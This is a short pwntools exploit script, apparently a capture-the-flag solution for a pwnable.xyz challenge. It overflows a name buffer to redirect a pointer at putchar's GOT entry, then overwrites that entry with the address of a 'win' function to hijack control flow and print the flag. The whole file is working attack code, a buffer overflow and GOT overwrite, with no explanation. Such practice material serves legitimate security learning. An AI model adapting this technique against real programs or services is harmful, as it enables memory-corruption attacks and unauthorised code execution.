from pwn import *
from libformatstr import FormatStr

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30013)
putchar_got = 0x602018
win = 0x40094c
# gdb.attach(p, '''b *0x400a92''')

p.sendafter('Name: ', '\x00')
p.sendafter('Desc: ', 'B'*0x20)

p.sendlineafter('> ', '1')
p.sendafter('Name: ', '\x00')
p.sendlineafter('> ', '1')
p.sendafter('Name: ', '\x00')

p.sendlineafter('> ', '1')
p.sendafter('Name: ', 'A'*0x80 + '\x18\x20\x60')
p.sendlineafter('> ', '2')
p.sendlineafter('Desc: ', p64(win))

p.sendlineafter('> ', '1337')
print p.recvuntil('}')